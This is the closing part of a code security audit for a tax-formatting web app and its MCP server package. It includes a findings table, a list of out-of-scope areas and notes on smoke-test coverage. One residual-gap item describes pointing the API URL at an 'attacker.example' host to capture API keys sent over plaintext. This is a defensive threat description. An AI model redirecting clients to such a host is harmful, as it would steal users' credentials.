| M-3   | Webhook metadata trusted without cross-verify        | Medium   | Payment          | `app/api/webhooks/stripe/route.ts:62-95`                       |
| M-4   | User enumeration via resend-code timing              | Medium   | Info disclosure  | `app/api/auth/resend-code/route.ts:32-38`                      |
| M-5   | 30-day JWT session                                   | Medium   | Session          | `app/api/auth/[...nextauth]/route.ts:79-85`                    |
| M-6   | Reset tokens reusable within window                  | Medium   | Auth             | `lib/auth-db.ts:417-439`                                       |
| M-7   | No rate limit on 2FA verify                          | Medium   | Brute force      | `app/api/auth/2fa/login-verify/route.ts`                       |
| M-8   | 32-bit 2FA backup codes                              | Medium   | Crypto entropy   | `lib/2fa.ts:46-54`                                             |
| M-9   | Verbose Python exception messages                    | Medium   | Info disclosure  | `backend/handlers/api.py:294-301`                              |
| M-10  | CSV formula injection                                | Medium   | Client RCE       | `backend/services/bank_statement/exporter.py:44`               |
| M-11  | Loose `pdfplumber` pin                               | Medium   | Dependency       | `backend/requirements-api.txt:10`                              |
| M-12  | Anonymous `/uploads/confirm`                         | Medium   | Authorization    | `app/api/uploads/[uploadId]/confirm/route.ts`                  |
| M-13  | Presigned URL expiry undocumented                    | Medium   | Secret lifetime  | `app/api/uploads/presigned-url/route.ts:84-93`                 |
| M-14  | `API_GATEWAY_URL` no allowlist                       | Medium   | SSRF             | Multiple                                                       |
| M-15  | Weak anonymous upload rate limit                     | Medium   | DoS              | `app/api/uploads/presigned-url/route.ts:14-21`                 |
| M-16  | NextAuth cookies use defaults                        | Medium   | Session          | `app/api/auth/[...nextauth]/route.ts`                          |
| M-17  | SMTP config logging                                  | Medium   | Info disclosure  | `lib/email.ts:10`                                              |
| M-18  | Docker Compose default password                      | Medium   | Dev hygiene      | `docker-compose.yml:9`                                         |
| M-19  | E2E credentials in `.env.local`                      | Medium   | Test/prod mix    | `.env.local:71-72`                                             |
| M-20  | `BYPASS_RATE_LIMIT=true` in `.env.local`             | Medium   | Test flag        | `.env.local:68`                                                |
| M-21  | `Referrer-Policy` not `strict-origin`                | Medium   | Info leakage     | `next.config.ts:44-45`                                         |
| L-1   | `api_tier` in URL query param                        | Low      | Info disclosure  | `app/login/page.tsx:66`                                        |
| L-2   | Analytics domains in `connect-src`                   | Low      | CSP scope        | `next.config.ts:63`                                            |
| L-3   | HSTS preload ✓ (no action)                           | Low      | —                | `next.config.ts`                                               |
| L-4   | 6-digit verification codes                           | Low      | Entropy          | `lib/email.ts`                                                 |
| L-5   | Gemini key in query string (backend)                 | Low      | Info disclosure  | `backend/handlers/**`                                          |
| L-6   | Dead `MAX_PROCESSED_EVENTS` after M-1                | Low      | Cleanup          | `app/api/webhooks/stripe/route.ts:12`                          |
| L-7   | Interval string concat in usage query                | Low      | SQL (fragile)    | `lib/api-keys.ts:160-167`                                      |
| L-8   | `X-Powered-By` removed ✓                             | Low      | —                | `next.config.ts`                                               |
| L-9   | Source map policy undocumented                       | Low      | Config           | `next.config.ts`                                               |
| L-10  | OAuth state default                                  | Low      | Auth             | `app/api/auth/[...nextauth]/route.ts`                          |
| L-11  | PII not encrypted at rest                            | Low      | Compliance       | —                                                              |

---

# Appendix B — Out of scope

The following were explicitly **not** covered by this audit and should be addressed separately:

- **Infrastructure / AWS IAM** review (who can assume which roles, least privilege on Lambda execution roles, VPC / security-group posture).
- **Supply chain review** of npm dependencies (the audit checked a few Python deps; a full `npm audit` + SCA scan is a separate task).
- **Penetration testing** — this is a code audit. A live pentest would exercise real Stripe flows, real email deliverability, and runtime network behavior.
- **Physical / social engineering** vectors.
- **Legal / regulatory compliance** (PCI DSS scope, GLBA controls, state privacy laws). Some findings touch these but a compliance review is a separate engagement.
- **Mobile client** (if one exists) — the audit is limited to the web + backend.
- **CI/CD pipeline** configuration (GitHub Actions workflows, secret handling in CI, branch protection rules).
- **MCP server package** at `packages/mcp-server` — published as `@taxformatter/mcp-server` on npm. The original audit was scoped to the Next.js app and Python Lambda. Post-audit smoke-test coverage for this subpackage is documented in Appendix C below.

---

# Appendix C — Post-audit test coverage: `@taxformatter/mcp-server`

**Status:** Added 2026-05-04 alongside the MCP directory submission push (Workstream 3). Smoke tests live at `packages/mcp-server/test/`.

## Why this is in the security audit

The MCP server runs on developer machines and AI agent runtimes (Claude Code, Cursor, etc.) with the user's API key in `TAXFORMATTER_API_KEY`. A bug in the client wrapper or tool dispatcher could:

- Silently swallow API errors, so a misconfigured key keeps "succeeding" with empty results.
- Log or echo back the API key in error messages.
- Send the wrong endpoint or method, leaking key material to an unintended host.
- Mishandle file reads (path traversal via `file_path` arg, symlinks).

The smoke tests don't catch all of those — see "Residual gaps" below — but they pin the contract and detect regressions in the security-adjacent behaviors that *are* covered.

## Test files

| File | Suite | Tests |
|------|-------|-------|
| [packages/mcp-server/test/client.test.ts](../packages/mcp-server/test/client.test.ts) | `TaxFormatterClient` | 6 |
| [packages/mcp-server/test/tools.test.ts](../packages/mcp-server/test/tools.test.ts) | `handleTool` dispatcher | 6 |

**Total:** 12 tests, run via `cd packages/mcp-server && npm test` (delegates to the root Jest runner; no new dependencies added).

## Coverage detail

### `client.test.ts` — TaxFormatterClient

Validates the network-boundary contract between the MCP server and the TaxFormatter API. Mocks `global.fetch`.

1. **`parse` — POSTs to `/v1/parse` with base64 file_content and X-API-Key header.**
   - Asserts URL composition (`baseUrl + '/v1/parse'`) so a future bug rerouting requests to a different host would fail loudly.
   - Asserts `X-API-Key` header is set from the constructor arg, not hardcoded or forgotten.
   - Asserts the file body is base64-encoded and that `Buffer.from(body.file_content, 'base64').toString()` round-trips back to the original bytes — guards against accidentally sending raw file content.

2. **`parse` — forwards optional `exchange` / `output_format` / `bank` options** when provided. Detects regression where options would be silently dropped.

3. **`listSources` — GETs `/v1/sources` with X-API-Key.** Same URL + auth-header pinning as `parse`.

4. **`getUsage` — GETs `/v1/usage` with X-API-Key.** Round-trip fixture asserts `tier: 'free'` is parsed correctly (regression guard for the v3 free-tier rollout).

5. **Error path — 401 surfaces as `TaxFormatterError`.**
   - Asserts the upstream `code`, `message`, `statusCode`, and `suggestion` fields propagate to the thrown error.
   - Critical because the MCP host (Claude Code, Cursor) renders the error to the user — silent swallowing or generic "request failed" messages would mask invalid-key situations and confuse end users.

6. **Error path — 429 `quota_exceeded` (free-tier hard-block).**
   - Pins the contract for the v3 free-tier 429 response shape so the MCP server reports `code = 'quota_exceeded'` and `statusCode = 429`. The MCP host can then surface "you've hit your free quota" rather than a generic 500.

### `tools.test.ts` — handleTool dispatcher

Validates each tool name actually shipped in `src/tools.ts`. Uses real temp files via `fs/promises.mkdtemp` so file-read paths are exercised end-to-end (not mocked away). Mocks the `TaxFormatterClient` so no network calls happen.

1. **`parse_crypto_csv` — reads file from disk, calls `client.parse`, formats summary text.**
   - Asserts the dispatcher reads the actual filesystem (not a mocked `fs`) — guards against a regression where `file_path` would be silently ignored.
   - Asserts the file's `basename` is sent as `filename` (not the full path), so the absolute path of the user's machine is not leaked over the wire.
   - Asserts the formatted output text contains the API summary, exchange, and transaction count — the strings the MCP host shows the user.

2. **`parse_crypto_csv` — throws on missing file.** Path traversal isn't blocked at this layer (see Residual gaps), but at minimum a non-existent file produces a clear error, not a stack trace.

3. **`parse_crypto_csv` — surfaces API errors with `status: 'error'` to the user as text.** Validates that an upstream parse failure (e.g., `unsupported_exchange`) reaches the MCP host as a readable error message, not an empty success.

4. **`parse_bank_statement` — reads file, calls `client.parse` with the `bank` option, formats summary.** Same boundary contract as `parse_crypto_csv`. Note that *enforcement* of bank-PDF-requires-Growth-tier happens at the API edge (see free-tier work in `PLAN_FREE_TIER_V3.md` §Phase 2); the MCP server is intentionally a thin client and does not duplicate that check.

5. **`list_supported_sources` — calls `client.listSources` and formats markdown output** with crypto exchanges, banks, and output formats. Pins the user-visible contract; a regression that dropped a section would fail this test.

6. **Unknown tool name — returns "Unknown tool" message rather than throwing.** Defensive: an MCP host calling a renamed/removed tool gets a graceful error string instead of crashing the agent.

## Residual gaps (NOT covered by these smoke tests)

The smoke tests are deliberately scoped to the regression-critical contract surface. The following are known gaps that future test work, a dedicated security review of this package, or upstream library guarantees should address:

- **Path traversal in `file_path`.** `parse_crypto_csv` and `parse_bank_statement` accept an arbitrary `file_path` from the MCP host and `resolve()` it. Today the MCP host (Claude Code) is trusted, so this is acceptable. If the MCP server is ever invoked from a less-trusted source (e.g., a hosted MCP runtime), `file_path` should be validated against an allowlist of directories.
- **Symlink following.** `readFile` follows symlinks. If a user accidentally symlinks `~/secrets/` to a parse target, the file gets sent to the API. No test for this; out of scope for v0.1.
- **API key in error messages.** No test asserts that the API key is *never* logged or echoed back. The current code doesn't include the key in any error string, but a future change could regress this silently.
- **HTTPS enforcement on `baseUrl`.** `TAXFORMATTER_API_URL` env var could be set to `http://attacker.example` and the client would happily POST API keys over plaintext. No test pins this. Workaround for now: document that `TAXFORMATTER_API_URL` should only be set for testing against a local dev stack.
- **Replay protection on retries.** No idempotency keys; a network-flaky retry could double-charge usage on the user's account. Out of scope for the MCP layer (the API itself doesn't currently support idempotency keys for `/v1/parse` either).
- **Rate-limit handling.** A 429 surfaces as `TaxFormatterError` but the MCP server does not back off or retry. The MCP host gets one error and may or may not surface the `Retry-After` value. Acceptable for v0.1; consider a thin retry wrapper later.
- **Real network integration test.** The smoke tests mock `fetch` entirely. A separate live integration test against a staging API key (gated on a CI secret) would catch end-to-end breakage.

## How to run

```bash
# From the package directory
cd packages/mcp-server
npm test

# Or from the repo root, run the same Jest invocation directly
npx jest packages/mcp-server/test
```

Both invocations use the root Jest config and its existing TypeScript transform; no devDependencies were added to `packages/mcp-server`.

## What this changes about the audit posture

These tests do **not** close any of the original 51 findings — none of those findings were in `packages/mcp-server`. They establish a regression baseline for the published npm package so that future free-tier or response-shape changes don't silently break the contract MCP hosts depend on. Treat this appendix as documentation of *post-audit testing work*, not new audit findings.

---

**End of audit.**

*Generated via 6 parallel Claude Explore subagents, each scoped to one vulnerability class, followed by manual verification of high-impact findings against the source tree.*
